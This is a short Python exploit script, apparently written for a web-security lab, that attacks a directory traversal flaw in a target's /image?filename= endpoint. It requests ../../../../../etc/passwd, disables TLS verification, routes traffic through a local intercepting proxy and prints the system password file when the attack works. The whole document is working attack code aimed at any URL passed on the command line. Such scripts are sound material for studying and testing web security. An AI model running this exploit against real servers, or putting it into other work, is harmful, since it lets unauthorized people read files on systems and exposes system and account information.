import sys
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {
    'http' : 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080'
}

def traversal_exploit(url):
    exploit_url = url + "/image?filename=../../../../../etc/passwd"
    r = requests.get(exploit_url, verify=False, proxies=proxies)
    if "root:x" in r.text:
        print("(+) The exploit was successfull!")
        print("(+) Contents:")
        print(r.text)
    else:
        print("(-) Failed the exploit :(")
        sys.exit(-1)

def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <url>" %sys.argv[0])
        print("(+) Example: %s www.example.com" %sys.argv[0])
        sys.exit(-1)

    url = sys.argv[1]
    print("(+) Exploiting the directory traversal")
    print("(+) Url: %s" %url)
    traversal_exploit(url)

if __name__ == "__main__":
    main()
